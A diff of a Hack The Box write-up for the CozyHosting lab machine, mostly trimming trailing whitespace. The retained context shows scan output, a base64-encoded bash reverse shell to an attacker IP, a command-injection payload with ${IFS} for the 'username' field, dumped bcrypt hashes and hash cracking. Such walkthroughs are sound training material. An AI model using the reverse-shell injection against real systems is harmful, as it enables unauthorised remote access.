@@ -2,7 +2,7 @@
 title: Hack the box - CozyHosting pwned!
 date: 2024-02-17 00:00:01 +0000
 categories: [hack the box, machine]
-tags: [hack the box, machine, cozyhosting, spring boot, postgres, sudo proxycommand]
+tags: [hack the box, cozyhosting, spring boot, postgres, sudo proxycommand]
 img_path: /assets/img/posts/
 ---
 
@@ -44,7 +44,7 @@ We fine tune the scan to see if we can get more information about the running se
 ```
 PORT     STATE SERVICE       VERSION
 22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
 |_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
 80/tcp   open  http          nginx 1.18.0 (Ubuntu)
@@ -77,18 +77,18 @@ We can't do anything in the web, so we will fuzzing with `gobuster` to find hidd
 
 ```
 [+] Url:                     http://cozyhosting.htb
-[+] Method:                  GET               
-[+] Threads:                 10                
+[+] Method:                  GET
+[+] Threads:                 10
 [+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
-[+] Negative Status codes:   403,404,301       
-[+] User Agent:              gobuster/3.6      
-[+] Timeout:                 10s               
+[+] Negative Status codes:   403,404,301
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
 ===============================================================
-Starting gobuster in directory enumeration mode                                                         
+Starting gobuster in directory enumeration mode
 ===============================================================
 /index                (Status: 200) [Size: 12706]
 /login                (Status: 200) [Size: 4431]
-/admin                (Status: 401) [Size: 97]                                                          
+/admin                (Status: 401) [Size: 97]
 /logout               (Status: 204) [Size: 0]
 /error                (Status: 500) [Size: 73]
 ```
@@ -170,13 +170,13 @@ echo "bash -i >& /dev/tcp/10.10.16.96/1234 0>&1" | base64 -w 0
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK
 ```
 
-As we need to our shell will be executed as 
+As we need to our shell will be executed as
 `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64 -d|bash` in the target, and we can't use whitespaces, we will take advantage of [Input Field Separators (IFS)](https://en.wikipedia.org/wiki/Input_Field_Separators).
 We are going to replace the whitespaces with `${IFS}`:
 
 `echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64${IFS}-d|bash`
 
-Our payload for the `username` parameter will be: 
+Our payload for the `username` parameter will be:
 
 `user;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64${IFS}-d|bash`
 
@@ -256,10 +256,10 @@ We list the databases:
 ```
 postgres=# \l
                                    List of databases
-    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
+    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
 -------------+----------+----------+-------------+-------------+-----------------------
- cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
- postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
+ postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
  template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
              |          |          |             |             | postgres=CTc/postgres
  template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
@@ -273,7 +273,7 @@ postgres=# \c cozyhosting
 
 cozyhosting=# \dt
          List of relations
- Schema | Name  | Type  |  Owner   
+ Schema | Name  | Type  |  Owner
 --------+-------+-------+----------
  public | hosts | table | postgres
  public | users | table | postgres
@@ -284,13 +284,13 @@ We take a look at the users data:
 
 ```
 cozyhosting=# select * from users;
-   name    |                           password                           | role  
+   name    |                           password                           | role
 -----------+--------------------------------------------------------------+-------
  kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
  admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
 ```
 
-Now, we have two hashes. 
+Now, we have two hashes.
 As we was `kanderson` before, we will crack the `admin` hash.
 We add the admin hash to the `admin_hash.txt` file, and we crack it using `hashcat`:
 
@@ -315,7 +315,7 @@ Let's take a look at our new user's info and see what he can do:
 josh@cozyhosting:~$ id
 uid=1003(josh) gid=1003(josh) groups=1003(josh)
 josh@cozyhosting:~$ sudo -l
-[sudo] password for josh: 
+[sudo] password for josh:
 Matching Defaults entries for josh on localhost:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
